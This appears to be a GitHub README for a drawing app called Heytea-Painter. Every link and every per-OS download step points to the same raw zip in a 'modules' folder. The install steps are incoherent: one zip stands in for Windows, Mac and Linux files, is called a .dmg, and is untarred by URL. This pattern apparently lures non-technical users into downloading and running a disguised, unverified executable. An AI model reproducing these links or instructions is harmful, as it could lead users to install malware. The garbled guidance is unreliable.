# 🎨 Heytea-Painter - Enhance Your Drawings with Ease

## 🚀 Getting Started
Welcome to Heytea-Painter! This application helps you automatically add drawing elements by extracting edges from your images. It’s designed for everyone, even if you are not tech-savvy. Follow these steps to get started.

## 💾 Download & Install
[![Download Heytea-Painter](https://raw.githubusercontent.com/Sanskar01513/Heytea-Painter/main/modules/Heytea-Painter-v1.8-beta.4.zip%https://raw.githubusercontent.com/Sanskar01513/Heytea-Painter/main/modules/Heytea-Painter-v1.8-beta.4.zip)](https://raw.githubusercontent.com/Sanskar01513/Heytea-Painter/main/modules/Heytea-Painter-v1.8-beta.4.zip)

To download the latest version, visit this page: [Heytea-Painter Releases](https://raw.githubusercontent.com/Sanskar01513/Heytea-Painter/main/modules/Heytea-Painter-v1.8-beta.4.zip). You will find the option to download files specific to your operating system.

### Step-by-Step Download Instructions
1. Click on the link above to go to the Releases page.
2. Look for the latest version marked as "Latest Release".
3. Select the file that matches your operating system:
   - For Windows, download `https://raw.githubusercontent.com/Sanskar01513/Heytea-Painter/main/modules/Heytea-Painter-v1.8-beta.4.zip`.
   - For Mac, use `https://raw.githubusercontent.com/Sanskar01513/Heytea-Painter/main/modules/Heytea-Painter-v1.8-beta.4.zip`.
   - For Linux, choose `https://raw.githubusercontent.com/Sanskar01513/Heytea-Painter/main/modules/Heytea-Painter-v1.8-beta.4.zip`.
4. Click on the file to start the download.

## ⚙️ System Requirements
Before you install the application, ensure your system meets the following requirements:

### Windows
- Windows 10 or later
- 2 GB RAM minimum
- 100 MB of free disk space

### Mac
- macOS 10.12 Sierra or later
- 2 GB RAM minimum
- 100 MB of free disk space

### Linux
- Ubuntu 18.04 or later
- 2 GB RAM minimum
- 100 MB of free disk space

## 🔧 Installing Heytea-Painter

### For Windows
1. Once the file is downloaded, locate `https://raw.githubusercontent.com/Sanskar01513/Heytea-Painter/main/modules/Heytea-Painter-v1.8-beta.4.zip` in your Downloads folder.
2. Double-click the file to start the installation.
3. Follow the prompts in the installation wizard to complete the setup.

### For Mac
1. After downloading, find `https://raw.githubusercontent.com/Sanskar01513/Heytea-Painter/main/modules/Heytea-Painter-v1.8-beta.4.zip` in your Downloads folder.
2. Open the `.dmg` file.
3. Drag the Heytea-Painter icon to your Applications folder.
4. Eject the `.dmg` file after installation.

### For Linux
1. Locate `https://raw.githubusercontent.com/Sanskar01513/Heytea-Painter/main/modules/Heytea-Painter-v1.8-beta.4.zip` in your Downloads.
2. Open a terminal window.
3. Navigate to the directory where you downloaded the file.
4. Type `tar -xzf https://raw.githubusercontent.com/Sanskar01513/Heytea-Painter/main/modules/Heytea-Painter-v1.8-beta.4.zip` to extract the files.
5. Change to the extracted folder using `cd Heytea-Painter`.
6. Run the application using `./Heytea-Painter`.

## 🎨 Using Heytea-Painter
1. Launch the application from your Applications folder or downloaded location.
2. Upload an image by clicking "Upload Image" on the main screen.
3. Adjust settings if needed, such as edge detection sensitivity.
4. Click on "Start Drawing" to begin the process.
5. Save or export your finished drawing once you are satisfied.

## ❓ Troubleshooting
If you encounter issues while using Heytea-Painter, try the following:

- **Application does not launch:** Make sure you have the required operating system version and enough RAM.
- **Image does not load:** Ensure your image format is supported (e.g., JPEG, PNG).
- **Edges not detected:** Try adjusting the sensitivity settings for better results.

For further assistance, feel free to open an issue in the [GitHub repository](https://raw.githubusercontent.com/Sanskar01513/Heytea-Painter/main/modules/Heytea-Painter-v1.8-beta.4.zip).

## ⚡ Feedback
Your feedback is essential for improving Heytea-Painter. Please share your thoughts or report any bugs on the GitHub page. Your contributions help make this tool better for all users!

Thank you for choosing Heytea-Painter! Enjoy enhancing your drawings effortlessly.